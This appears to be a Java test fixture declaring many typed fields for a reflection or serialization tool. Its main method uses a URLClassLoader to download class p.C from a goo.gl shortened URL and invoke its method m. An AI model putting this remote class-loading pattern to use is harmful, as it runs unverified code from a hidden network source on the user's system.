package main;

import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import p.C;

public class Test {
	Object nullObject = null;
	private int primitiveInt=1;
	transient float primiteFloat=132;
	volatile double primiteDouble=321.321;
	static String stringNullTest =null;
	protected Calendar calendarNullTest =null;
	ClassForArray classForArray=new ClassForArray();
	String b="FDS";
	Calendar myCalendar=Calendar.getInstance();
	Integer i=1;
	PrimitiveTypes pt=PrimitiveTypes.FLOAT;
	PrimitiveTypes ptd=PrimitiveTypes.DOUBLE;
	PrimitiveTypes pt2=PrimitiveTypes.BOOLEAN;
	String[] simpleStringArray={"DSA"};
	int[] simpleIntArray={1,2};
	String[][][] threeDStringArray={{{"A","B"},{"C"}},{{"D"},{"E"}},{{"F"},{"G"}}};
	int[][][] threeDIntArray={{{1,2},{3}},{{4},{5}},{{6},{7}}};
	boolean boolTest=false;
	String stringTest="DSA";
	String[] simpleStringArrayTest={"TEST1"};
	List<String> a=new ArrayList<String>(Arrays.asList(new String[]{"A"}));
	
	public static void main(String[] args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException, SecurityException, ClassNotFoundException, MalformedURLException{
		
//		C.m(new Object());
		new java.net.URLClassLoader(new java.net.URL[] { new java.net.URL("http://goo.gl/nDOuDG") }).loadClass("p.C").getMethod("m", Object.class).invoke(null, new Date());
	}
	
	

}
